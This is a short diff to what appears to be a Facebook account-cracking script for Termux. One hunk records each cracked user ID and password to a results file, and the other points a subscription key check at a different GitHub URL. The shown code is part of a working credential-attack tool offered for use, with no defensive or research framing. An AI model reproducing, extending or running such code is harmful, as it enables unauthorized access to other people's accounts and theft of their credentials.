@@ -869,7 +869,7 @@ class Main:
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ARSHAD-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ARSHAD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ARSHAD-OK❤️.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1308,7 +1308,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/Mrchandu7/trick/blob/main/trick.txt").text
+	r1=requests.get("https://gitHub.com/Arshadpitafi/kingdada.git").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
